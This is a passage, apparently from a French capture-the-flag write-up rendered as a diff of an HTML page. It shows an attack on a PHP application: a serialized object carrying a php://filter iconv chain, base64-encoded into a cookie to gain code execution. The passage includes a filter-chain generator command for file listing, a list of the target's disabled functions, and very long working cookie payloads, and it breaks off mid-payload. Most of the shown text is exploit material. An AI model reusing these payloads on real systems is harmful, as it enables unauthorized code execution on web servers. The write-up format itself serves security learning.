IBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&quot;;s:5:&quot;debug&quot;;b:1;s:7:&quot;version&quot;;s:4:&quot;v1.0&quot;;s:11:&quot;betterprint&quot;;b:1;}</span>
+<span class="go">Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czo0MTMwOiJwaHA6Ly9maWx0ZXIvY29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkyMS5OQVBMUFN8Y29udmVydC5pY29udi44NTUuQ1A5MzZ8Y29udmVydC5pY29udi5JQk0tOTMyLlVURi04fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5NUzkzMi5NUzkzNnxjb252ZXJ0Lmljb252LkJJRzUuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LklCTTg2OS5VVEYxNnxjb252ZXJ0Lmljb252LkwzLkNTSVNPOTB8Y29udmVydC5pY29udi5VQ1MyLlVURi04fGNvbnZlcnQuaWNvbnYuQ1NJU09MQVRJTjYuVUNTLTR8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Ljg4NTlfMy5VVEYxNnxjb252ZXJ0Lmljb252Ljg2My5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODUxLlVURi0xNnxjb252ZXJ0Lmljb252LkwxLlQuNjE4QklUfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DU0FfVDUwMC5VVEYtMzJ8Y29udmVydC5pY29udi5DUDg1Ny5JU08tMjAyMi1KUC0zfGNvbnZlcnQuaWNvbnYuSVNPMjAyMkpQMi5DUDc3NXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSUJNODkxLkNTVU5JQ09ERXxjb252ZXJ0Lmljb252LklTTzg4NTktMTQuSVNPNjkzN3xjb252ZXJ0Lmljb252LkJJRy1GSVZFLlVDUy00fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MjEuTkFQTFBTfGNvbnZlcnQuaWNvbnYuODU1LkNQOTM2fGNvbnZlcnQuaWNvbnYuSUJNLTkzMi5VVEYtOHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODUxLlVURi0xNnxjb252ZXJ0Lmljb252LkwxLlQuNjE4QklUfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0Lmljb252LlVDUy0yLk9TRjAwMDMwMDEwfGNvbnZlcnQuaWNvbnYuQ1NJQk0xMDA4LlVURjMyQkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkyMS5OQVBMUFN8Y29udmVydC5pY29udi5DUDExNjMuQ1NBX1Q1MDB8Y29udmVydC5pY29udi5VQ1MtMi5NU0NQOTQ5fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVVRGMTYuRVVDVFd8Y29udmVydC5pY29udi44ODU5XzMuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuTVM5MzIuTVM5MzZ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQMTA0Ni5VVEYzMnxjb252ZXJ0Lmljb252Lkw2LlVDUy0yfGNvbnZlcnQuaWNvbnYuVVRGLTE2TEUuVC42MS04QklUfGNvbnZlcnQuaWNvbnYuODY1LlVDUy00TEV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lk1BQy5VVEYxNnxjb252ZXJ0Lmljb252Lkw4LlVURjE2QkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNTR0IyMzEyLlVURi0zMnxjb252ZXJ0Lmljb252LklCTS0xMTYxLklCTTkzMnxjb252ZXJ0Lmljb252LkdCMTMwMDAuVVRGMTZCRXxjb252ZXJ0Lmljb252Ljg2NC5VVEYtMzJMRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuTDYuVU5JQ09ERXxjb252ZXJ0Lmljb252LkNQMTI4Mi5JU08tSVItOTB8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw0LlVURjMyfGNvbnZlcnQuaWNvbnYuQ1AxMjUwLlVDUy0yfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MjEuTkFQTFBTfGNvbnZlcnQuaWNvbnYuODU1LkNQOTM2fGNvbnZlcnQuaWNvbnYuSUJNLTkzMi5VVEYtOHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODg1OV8zLlVURjE2fGNvbnZlcnQuaWNvbnYuODYzLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUDEwNDYuVVRGMTZ8Y29udmVydC5pY29udi5JU082OTM3LlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUDEwNDYuVVRGMzJ8Y29udmVydC5pY29udi5MNi5VQ1MtMnxjb252ZXJ0Lmljb252LlVURi0xNkxFLlQuNjEtOEJJVHxjb252ZXJ0Lmljb252Ljg2NS5VQ1MtNExFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5NQUMuVVRGMTZ8Y29udmVydC5pY29udi5MOC5VVEYxNkJFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DU0lCTTExNjEuVU5JQ09ERXxjb252ZXJ0Lmljb252LklTTy1JUi0xNTYuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LklOSVMuVVRGMTZ8Y29udmVydC5pY29udi5DU0lCTTExMzMuSUJNOTQzfGNvbnZlcnQuaWNvbnYuSUJNOTMyLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5NUzkzMi5NUzkzNnxjb252ZXJ0Lmljb252LkJJRzUuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9cGhwOi8vdGVtcCI7czo1OiJkZWJ1ZyI7YjoxO3M6NzoidmVyc2lvbiI7czo0OiJ2MS4wIjtzOjExOiJiZXR0ZXJwcmludCI7YjoxO30K</span>
+</pre></div>
+</div>
+<p>On met ça dans notre cookie, on l’encode en base64 et bim phpinfo !</p>
+<p>Par contre on a beaucoup de fonctions désactivés ça va pas être évident :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">apache_note, apache_setenv, chgrp, curl_multi_exec, define_sys, define_syslog_variables, debugger_off, debugger_on, diskfreespace, _getppid, escapeshellarg, escapeshellcmd, exec, getmyuid, ini_restore, leak, listen, parse_ini_file, passthru, pcntl_alarm, pcntl_async_signals, pcntl_exec, pcntl_fork, file_put_contents, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifcontinued, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, posix, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, popen, proc_close, proc_get_status, proc_nice, proc_open, proc_terminate, shell_exec, show_source, system, url_exec, preg_replace, opendir, readdir, scandir, print_r</span>
+
+<span class="go">python3 php_filter_chain_generator.py --chain &#39;&lt;?php foreach (array_map(&quot;basename&quot;, glob(&quot;/var/www/html/*&quot;)) as $file) echo $file . &quot;\n&quot;; ?&gt;&#39;</span>
+</pre></div>
+</div>
+<p>On récupère la sortie, on l’a met dans l’objet, avec une taille de 18713, on encode le tout en base64 et on envoie le cookie :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czoxODcxMzoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2fGNvbnZlcnQuaWNvbnYuV0lORE9XUy0xMjU4LlVURjMyTEV8Y29udmVydC5pY29udi5JU0lSSTMzNDIuSVNPLUlSLTE1N3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSVNPMjAyMktSLlVURjE2fGNvbnZlcnQuaWNvbnYuTDYuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSU5JUy5VVEYxNnxjb252ZXJ0Lmljb252LkNTSUJNMTEzMy5JQk05NDN8Y29udmVydC5pY29udi5JQk05MzIuU0hJRlRfSklTWDAyMTN8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw1LlVURi0zMnxjb252ZXJ0Lmljb252LklTTzg4NTk0LkdCMTMwMDB8Y29udmVydC5pY29udi5CSUc1LlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NTEuVVRGLTE2fGNvbnZlcnQuaWNvbnYuTDEuVC42MThCSVR8Y29udmVydC5pY29udi5JU08tSVItMTAzLjg1MHxjb252ZXJ0Lmljb252LlBUMTU0LlVDUzR8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw1LlVURi0zMnxjb252ZXJ0Lmljb252LklTTzg4NTk0LkdCMTMwMDB8Y29udmVydC5pY29udi5CSUc1LlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5ERUMuVVRGLTE2fGNvbnZlcnQuaWNvbnYuSVNPODg1OS05LklTT182OTM3LTJ8Y29udmVydC5pY29udi5VVEYxNi5HQjEzMDAwfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0Lmljb252LlVDUy0yLk9TRjAwMDMwMDEwfGNvbnZlcnQuaWNvbnYuQ1NJQk0xMDA4LlVURjMyQkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw0LlVURjMyfGNvbnZlcnQuaWNvbnYuQ1AxMjUwLlVDUy0yfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NjMuVU5JQ09ERXxjb252ZXJ0Lmljb252LklTSVJJMzM0Mi5VQ1M0fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5MNS5VVEYtMzJ8Y29udmVydC5pY29udi5JU084ODU5NC5HQjEzMDAwfGNvbnZlcnQuaWNvbnYuQklHNS5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AxMTYyLlVURjMyfGNvbnZlcnQuaWNvbnYuTDQuVC42MXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODg1OV8zLlVURjE2fGNvbnZlcnQuaWNvbnYuODYzLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5JTklTLlVURjE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTMzLklCTTk0M3xjb252ZXJ0Lmljb252LkdCSy5TSklTfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5CSUc1SEtTQ1MuVVRGMTZ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LklCTTg2OS5VVEYxNnxjb252ZXJ0Lmljb252LkwzLkNTSVNPOTB8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQLUFSLlVURjE2fGNvbnZlcnQuaWNvbnYuODg1OV80LkJJRzVIS1NDU3xjb252ZXJ0Lmljb252Lk1TQ1AxMzYxLlVURi0zMkxFfGNvbnZlcnQuaWNvbnYuSUJNOTMyLlVDUy0yQkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkyMS5OQVBMUFN8Y29udmVydC5pY29udi5DUDExNjMuQ1NBX1Q1MDB8Y29udmVydC5pY29udi5VQ1MtMi5NU0NQOTQ5fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5CSUc1SEtTQ1MuVVRGMTZ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkpTLlVOSUNPREV8Y29udmVydC5pY29udi5MNC5VQ1MyfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44ODU5XzMuVVRGMTZ8Y29udmVydC5pY29udi44NjMuU0hJRlRfSklTWDAyMTN8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Ljg1MS5VVEYtMTZ8Y29udmVydC5pY29udi5MMS5ULjYxOEJJVHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSlMuVU5JQ09ERXxjb252ZXJ0Lmljb252Lkw0LlVDUzJ8Y29udmVydC5pY29udi5VQ1MtMi5PU0YwMDAzMDAxMHxjb252ZXJ0Lmljb252LkNTSUJNMTAwOC5VVEYzMkJFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0Lmljb252LlVDUy00TEUuT1NGMDUwMTAwMDF8Y29udmVydC5pY29udi5JQk05MTIuVVRGLTE2TEV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQODY5LlVURi0zMnxjb252ZXJ0Lmljb252Lk1BQ1VLLlVDUzR8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTExNjEuSUJNLTkzMnxjb252ZXJ0Lmljb252Lk1TOTMyLk1TOTM2fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5CSUc1SEtTQ1MuVVRGMTZ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkyMS5OQVBMUFN8Y29udmVydC5pY29udi44NTUuQ1A5MzZ8Y29udmVydC5pY29udi5JQk0tOTMyLlVURi04fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuSU5JUy5VVEYxNnxjb252ZXJ0Lmljb252LkNTSUJNMTEzMy5JQk05NDN8Y29udmVydC5pY29udi5HQksuU0pJU3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuQklHNUhLU0NTLlVURjE2fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5JQk04NjkuVVRGMTZ8Y29udmVydC5pY29udi5MMy5DU0lTTzkwfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUC1BUi5VVEYxNnxjb252ZXJ0Lmljb252Ljg4NTlfNC5CSUc1SEtTQ1N8Y29udmVydC5pY29udi5NU0NQMTM2MS5VVEYtMzJMRXxjb252ZXJ0Lmljb252LklCTTkzMi5VQ1MtMkJFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MjEuTkFQTFBTfGNvbnZlcnQuaWNvbnYuQ1AxMTYzLkNTQV9UNTAwfGNvbnZlcnQuaWNvbnYuVUNTLTIuTVNDUDk0OXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuQklHNUhLU0NTLlVURjE2fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODg1OV8zLlVURjE2fGNvbnZlcnQuaWNvbnYuODYzLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NTEuVVRGLTE2fGNvbnZlcnQuaWNvbnYuTDEuVC42MThCSVR8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Lkw0LlVURjMyfGNvbnZlcnQuaWNvbnYuQ1AxMjUwLlVDUy0yfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DU0dCMjMxMi5VVEYtMzJ8Y29udmVydC5pY29udi5JQk0tMTE2MS5JQk05MzJ8Y29udmVydC5pY29udi5HQjEzMDAwLlVURjE2QkV8Y29udmVydC5pY29udi44NjQuVVRGLTMyTEV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQODYxLlVURi0xNnxjb252ZXJ0Lmljb252Lkw0LkdCMTMwMDB8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LklOSVMuVVRGMTZ8Y29udmVydC5pY29udi5DU0lCTTExMzMuSUJNOTQzfGNvbnZlcnQuaWNvbnYuR0JLLlNKSVN8Y29ud